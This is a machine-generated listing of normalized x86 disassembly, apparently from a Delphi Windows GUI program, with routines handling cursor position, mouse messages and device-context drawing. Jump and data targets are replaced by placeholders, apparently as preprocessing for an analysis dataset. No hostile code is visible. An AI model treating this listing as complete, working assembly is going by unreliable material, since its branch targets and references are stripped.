mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425540
retn
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
jmp r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
jmp r-xdata
sub_43b8c8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov ebx eax
test [ ebx + 0x98 ] 0x4
je r-xdata
mov ecx [ esp ]
mov edx ebp
mov eax ebx
call sub_455b60
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x23c ]
call sub_419720
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
mov eax [ esp ]
push eax
push ebp
mov edx esi
mov eax [ ebx + 0x23c ]
call sub_437d4c
call sub_437b74
push eax
call MulDiv
push eax
mov edx esi
mov eax [ ebx + 0x23c ]
call sub_437d4c
pop edx
call sub_437ba8
inc esi
dec edi
jne r-xdata
sub_43b95c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x2e2 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2e4 ]
call [ ebx + 0x2e0 ]
sub_43b9ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_43ba05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x22c ]
call sub_438a20
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4384c0
mov edx esi
mov eax ebx
call sub_438570
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ba0c
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_43ba14
push ebx
push ecx
mov [ esp ] 0x1
dec ecx
je r-xdata
xor ecx ecx
jmp r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x2ca ] 0x0
je r-xdata
mov cl 0x1
jmp r-xdata
sub ecx 0x6
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
mov cl 0x2
jmp r-xdata
sub_43ba5c
push ebx
dec ecx
je r-xdata
xor ecx ecx
jmp r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
mov cl 0x1
jmp r-xdata
sub ecx 0x6
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov cl 0x2
jmp r-xdata
sub_43ba94
push ebx
push esi
mov ebx edx
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x29 ] 0x0
jne r-xdata
cmp [ eax + 0x32a ] 0x0
je r-xdata
mov [ ebx + 0x29 ] 0x1
mov eax ebx
call sub_4383dc
mov esi eax
mov ecx ebx
mov edx eax
mov eax [ esi + 0x32c ]
call [ esi + 0x328 ]
sub_43bacc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x342 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x344 ]
call [ ebx + 0x340 ]
sub_43baf8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43bb69
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x14 ]
call sub_4042a4
mov edx esi
mov eax ebx
call sub_43aa50
mov esi eax
cmp [ ebx + 0x33a ] 0x0
je r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x33c ]
call [ ebx + 0x338 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bb70
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4384c0
sub_43bb78
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf0 ]
dec eax
jne r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x224 ]
pop ebx
retn
sub_43bb94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
cmp eax 0xf
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax [ ebx + 0x22c ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp eax 0x14
jne r-xdata
mov eax ebx
call sub_44ffdc
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_453a68
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_4539d4
test al al
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_43bc12
add [ eax ] al
push ebx
push esi
add esp 0xffffffd8
mov ebx eax
mov eax ebx
call sub_450050
xor eax eax
mov [ ebx + 0x270 ] eax
push esp
call GetCursorPos
lea ecx [ esp + 0x20 ]
mov edx esp
mov eax ebx
call sub_44f398
mov eax [ esp + 0x20 ]
mov [ esp ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x26c ]
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_438aac
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_43c330
mov esi eax
mov [ ebx + 0x26c ] 0xffffffff
test esi esi
jne r-xdata
add esp 0x28
pop esi
pop ebx
retn
mov eax esi
call sub_4388f4
push eax
mov eax ebx
call sub_456054
lea ecx [ esp + 0xc ]
pop edx
call sub_42a7b0
test eax eax
je r-xdata
mov ebx [ ebx + 0x224 ]
mov edx eax
mov eax ebx
call sub_45cba4
lea ecx [ esp + 0x10 ]
xor edx edx
mov eax esi
call sub_438910
mov eax [ esp + 0x4 ]
sub eax [ esp + 0x14 ]
push eax
mov ecx [ esp + 0x4 ]
sub ecx [ esp + 0x14 ]
xor edx edx
mov eax ebx
call sub_457aec
sub_43bce8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_450070
mov eax [ ebx + 0x224 ]
call sub_457cd4
xor eax eax
mov [ ebx + 0x270 ] eax
pop ebx
pop ebp
retn 0x4
sub_43bd14
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45570c
mov edi [ esi + 0x8 ]
mov al [ esi + 0x4 ]
dec al
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax ebx
call sub_43c16c
mov [ ebx + 0x270 ] eax
xor edx edx
mov eax ebx
call sub_43c190
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
jmp r-xdata
dec al
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx edi
mov eax ebx
call sub_44f398
mov eax [ esp + 0x4 ]
push eax
cmp [ esi + 0xc ] 0x0
setne al
push eax
mov edx [ edi + 0x8 ]
mov ecx [ esp + 0x8 ]
mov eax ebx
call sub_43be48
jmp r-xdata
dec al
je r-xdata
xor eax eax
mov [ ebx + 0x270 ] eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
jmp r-xdata
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
mov eax ebx
call sub_43bf6c
mov esi eax
lea ecx [ esp + 0x8 ]
xor edx edx
xor eax eax
call sub_406158
lea edx [ esp + 0x8 ]
mov cl 0x4
mov eax ebx
call sub_43c2c8
mov esi eax
jmp r-xdata
mov eax esi
call sub_4388f4
push eax
mov eax [ ebx + 0x22c ]
call sub_438a7c
mov edi eax
dec edi
pop eax
sub edi eax
jl r-xdata
test esi esi
je r-xdata
inc edi
mov esi eax
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_438aac
xor ecx ecx
mov edx 0x1
call sub_438608
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_438aac
mov edx 0x1
call sub_4385a0
test al al
je r-xdata
sub_43be48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ ebp + 0xc ]
call sub_43c330
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
call sub_43c16c
mov edi eax
cmp edi ebx
jne r-xdata
xor eax eax
mov [ esi + 0x270 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
test edi edi
je r-xdata
cmp ebx [ esi + 0x270 ]
jne r-xdata
mov cl [ ebp + 0x8 ]
mov edx 0x1
mov eax ebx
call sub_438608
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor ecx ecx
mov edx 0x1
mov eax edi
call sub_438608
sub_43beec
push ebx
mov ebx eax
mov eax ebx
call sub_456358
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_456054
mov edx sub_439464
xor ecx ecx
call sub_42a920
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_43bf1c
cmp dl [ eax + 0x229 ]
je r-xdata
retn
mov [ eax + 0x229 ] dl
mov dl [ eax + 0x229 ]
mov ecx edx
sub cl 0x1
je r-xdata
cmp [ eax + 0x2ea ] 0x0
jne r-xdata
sub cl 0x2
jne r-xdata
call sub_43beec
add dl 0xfe
sub dl 0x2
jae r-xdata
sub_43bf6c
push ebx
push esi
mov ebx eax
xor esi esi
mov al [ ebx + 0x215 ]
sub al 0x2
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_456054
call sub_42a7fc
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_438aac
mov esi eax
sub_43bfa4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x218 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x218 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_45d560
xor ecx ecx
xor edx edx
mov eax ebx
call sub_439bfc
mov edx [ ebx + 0x27c ]
call sub_45d5a4
mov edx ebx
mov eax [ ebx + 0x218 ]
call sub_421440
mov eax [ ebx + 0x218 ]
call sub_45cbd0
mov edx eax
xor ecx ecx
mov eax ebx
call sub_439bfc
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43c014
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x21c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x21c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x280 ]
call sub_45d560
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_439bfc
mov edx [ ebx + 0x280 ]
call sub_45d5a4
mov edx ebx
mov eax [ ebx + 0x21c ]
call sub_421440
mov eax [ ebx + 0x21c ]
call sub_45cbd0
mov edx eax
mov ecx 0x1
mov eax ebx
call sub_439bfc
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43c08c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x220 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x220 ] esi
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edx [ ebx + 0x284 ]
call sub_45d560
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
mov eax ebx
call sub_43a1e8
mov ecx 0x2
xor edx edx
mov eax ebx
call sub_439bfc
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov edx [ ebx + 0x284 ]
call sub_45d5a4
mov edx ebx
mov eax [ ebx + 0x220 ]
call sub_421440
mov eax [ ebx + 0x220 ]
call sub_45cbd0
mov edx eax
mov ecx 0x2
mov eax ebx
call sub_439bfc
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor edx edx
mov eax ebx
call sub_43a26c
mov dl 0x1
mov eax ebx
call sub_43a26c
mov eax ebx
call sub_43a15c
jmp r-xdata
sub_43c16c
push ebx
mov ebx eax
mov al [ r-xdata ]
push eax
mov cl 0x4
xor edx edx
mov eax ebx
call sub_43c1f4
test eax eax
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x270 ]
sub_43c190
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456358
test al al
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov eax ebx
call sub_43c16c
mov esi eax
test esi esi
je r-xdata
mov cl 0x1
mov edx 0x1
mov eax esi
call sub_438608
jmp r-xdata
xor ecx ecx
mov edx 0x1
mov eax esi
call sub_438608
sub_43c1f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_456358
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor eax eax
mov al [ ebp - 0x1 ]
cmp eax 0x4
ja r-xdata
test edi edi
je r-xdata
jmp [ eax * 4 + jump_table_43c22b ]
or edi 0xffffffff
mov eax edi
call sub_4388f4
mov edi eax
jmp r-xdata
mov esi 0x100
jmp r-xdata
mov esi 0x200
jmp r-xdata
mov esi 0x400
jmp r-xdata
mov esi 0x800
jmp r-xdata
xor esi esi
test [ ebp + 0x8 ] 0x4
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
test [ ebp + 0x8 ] 0x8
je r-xdata
or esi 0x8
test [ ebp + 0x8 ] 0x10
je r-xdata
or esi 0x1
mov eax ebx
call sub_456054
mov ecx esi
mov edx edi
call sub_42a668
mov edi eax
cmp edi 0xffffffff
je r-xdata
or esi 0x2
mov edx edi
mov eax [ ebx + 0x22c ]
call sub_438aac
mov [ ebp - 0x8 ] eax
sub_43c2c8
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
mov [ esp + 0x8 ] 0x40
mov eax [ esp ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov [ esp + 0x1c ] eax
mov eax esi
call sub_456054
lea ecx [ esp + 0x8 ]
or edx 0xffffffff
call sub_42a68c
cmp eax 0xffffffff
je r-xdata
xor eax eax
mov edx eax
mov eax [ esi + 0x22c ]
call sub_438aac
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
sub_43c330
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov ebp ecx
mov edi edx
mov ebx eax
xor esi esi
mov eax ebx
call sub_456358
test al al
je r-xdata
mov eax esi
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0x14 ]
mov edx ebp
mov eax edi
call sub_406158
mov eax [ esp + 0x14 ]
mov [ esp ] eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_456054
mov edx esp
call sub_42a6d8
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_438aac
mov esi eax
sub_43c394
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_456054
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_42a704
pop esi
pop ebx
retn
sub_43c3b4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_456358
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x295 ] 0x0
jne r-xdata
mov eax [ ebx + 0x23c ]
call sub_419720
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43c3f4
inc edi
dec esi
jne r-xdata
sub_43c3f4
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp edx
mov ebx eax
mov eax ebx
call sub_456358
test al al
je r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_437d4c
mov edi eax
mov [ esp + 0x1 ] 0x15
mov eax [ edi + 0x1c ]
mov [ esp + 0x19 ] eax
mov eax [ edi + 0x10 ]
call sub_40456c
mov [ esp + 0xd ] eax
mov al [ edi + 0xc ]
mov [ esp ] al
mov eax edi
call sub_419390
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0x5 ] eax
mov eax ebx
mov si 0xffc8
call sub_4034ac
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ esp ]
mov eax [ eax + edx * 4 ]
mov [ esp + 0x5 ] eax
jmp r-xdata
and [ esp + 0x1 ] 0xffffffef
mov eax [ esp + 0x5 ]
or eax 0x800
or eax 0x8000
mov [ esp + 0x5 ] eax
jmp r-xdata
cmp [ edi + 0x1c ] 0xffffffff
je r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_437d4c
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_456054
lea ecx [ esp + 0x5 ]
pop edx
call sub_42a730
cmp [ ebx + 0x215 ] 0x2
jne r-xdata
or [ esp + 0x1 ] 0x2
mov [ esp + 0x9 ] eax
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_437d4c
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_456054
lea ecx [ esp + 0x5 ]
pop edx
call sub_42a730
jmp r-xdata
mov eax [ edi + 0x24 ]
cmp eax 0xffffffff
jle r-xdata
cmp [ ebx + 0x215 ] 0x3
jne r-xdata
mov eax ebx
call sub_456054
mov ecx [ edi + 0x24 ]
or edx 0xffffffff
call sub_42a78c
jmp r-xdata
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
mov edx ebp
mov eax [ ebx + 0x23c ]
call sub_437d4c
mov eax [ eax + 0x28 ]
push eax
mov eax ebx
call sub_456054
mov ecx [ edi + 0x24 ]
pop edx
call sub_42a78c
sub_43c544
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov edi edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
mov ax [ edi + 0x4 ]
call sub_46661c
mov ebx eax
mov [ esi + 0x230 ] 0x0
mov [ esi + 0x26c ] 0xffffffff
mov edx edi
mov eax esi
call sub_450ef0
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x230 ] 0x0
je r-xdata
cmp [ esi + 0x228 ] 0x0
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0xc ]
mov edx esp
mov eax esi
call sub_44f398
lea eax [ esp + 0xc ]
call sub_406cf0
mov [ esp + 0x8 ] eax
mov eax esi
call sub_44ffdc
test al al
jne r-xdata
test bl 0x1
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x228 ] 0x0
je r-xdata
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_406c64
push eax
push 0x0
push 0x202
call GetCapture
push eax
call SendMessageA
jmp r-xdata
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_406c64
push eax
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_450a20
mov [ esi + 0x230 ] 0x0
jmp r-xdata
test bl 0x4
jne r-xdata
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_43c330
mov ebp eax
test ebp ebp
je r-xdata
test bl 0x1
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov edx 0x3
mov eax ebp
call sub_4385a0
test al al
je r-xdata
test bl 0x4
jne r-xdata
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_43c330
mov ebp eax
test ebp ebp
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_44ff14
mov edx 0x3
mov eax ebp
call sub_4385a0
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_44ff14
jmp r-xdata
sub_43c6a8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_43c82c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_44f258
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419720
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc edi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c833
mov eax [ ebp - 0x14 ]
call sub_4032b0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_43c80f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax esi
call sub_437b74
sub [ ebp - 0xc ] eax
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_418854
jmp r-xdata
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4189b0
mov esi eax
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx ebx
call sub_437d4c
mov esi eax
cmp [ esi + 0xd ] 0x0
je r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4189b0
mov esi eax
test ebx ebx
jne r-xdata
mov edx edi
mov eax esi
call sub_437ba8
dec ebx
cmp ebx 0xffffffff
jne r-xdata
add edi [ ebp - 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax esi
call sub_437b74
cmp edi eax
je r-xdata
add edi [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv [ ebp - 0x8 ]
mov edi eax
mov ebx [ ebp - 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4188a0
mov eax esi
call sub_437b74
sub [ ebp - 0xc ] eax
sub_43c83c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_454530
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov eax ebx
call sub_456358
test al al
je r-xdata
mov eax ebx
call sub_43c6a8
sub_43c870
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov bx [ eax + 0x10 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4252d4
xor eax eax
push ebp
push sub_43c989
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4256c8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425568
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425584
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
cmp esi 0xffffffff
jne r-xdata
push ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_438aac
mov edx eax
mov eax [ ebp - 0x10 ]
lea ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x110 ]
mov eax [ ebp - 0x10 ]
lea edx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425224
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c990
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_4256c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425540
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
sub_43c9a8
test cl cl
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp dl 0x2
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp [ eax + 0x2ba ] 0x0
setne al
jmp r-xdata
cmp dl 0x1
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
cmp [ eax + 0x2aa ] 0x0
jne r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
retn
cmp [ eax + 0x2f2 ] 0x0
jne r-xdata
cmp [ eax + 0x2fa ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
mov al 0x1
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x2aa ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2fa ] 0x0
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2b2 ] 0x0
jne r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
cmp [ eax + 0x302 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2ba ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub_43cab0
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
test bl bl
jne r-xdata
cmp [ esi + 0x2aa ] 0x0
je r-xdata
cmp [ esi + 0x2f2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push ebx
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0x2ac ]
call [ esi + 0x2a8 ]
push esp
mov ecx edi
mov edx esi
mov eax [ esi + 0x2f4 ]
call [ esi + 0x2f0 ]
